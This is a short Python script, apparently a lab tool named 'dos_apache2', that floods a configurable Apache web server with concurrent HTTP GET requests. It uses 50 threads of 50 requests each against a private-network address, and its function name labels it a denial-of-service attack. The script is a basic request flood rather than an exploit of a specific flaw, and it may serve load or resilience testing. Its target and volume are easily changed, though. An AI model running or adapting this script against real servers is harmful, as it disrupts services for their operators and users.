# dos_apache2

import requests
import threading

# ----- CONFIGURATION ----- #

NUMBER_OF_ATTEMPTS = 50
NUMBER_OF_THREADS = 50
URL_TO_GET = "http://192.168.1.78:80/"

# ----- PREPARATIONS ----- #

class MyThread(threading.Thread):
    def __init__(self, nbr: int):
        threading.Thread.__init__(self)
        self.nbr_iterations = nbr

    @classmethod
    def thread_function(self, nbr_iter):
        for i in range(nbr_iter):
            response = requests.get(url=URL_TO_GET)
            assert(200 <= response.status_code < 400)

    def run(self):
        self.thread_function(self.nbr_iterations)

def run_dos_apache(url: str=URL_TO_GET):
    global URL_TO_GET
    URL_TO_GET = url

    # ----- Initial test to ensure everything is okay ----- #

    MyThread.thread_function(1)  # Just to ensure that the config is okay
    print("Setup is okay, we now start the loop.")

    # ----- MAIN LOOP ----- #

    thread_list = [MyThread(NUMBER_OF_ATTEMPTS) for i in range(NUMBER_OF_THREADS)]
    print("threads created. list size={}".format(len(thread_list)))
    [thread.start() for thread in thread_list]
    print("threads started")
    #[thread.join() for thread in thread_list]
    for thread in thread_list:
        thread.join()
    print("threads joined")
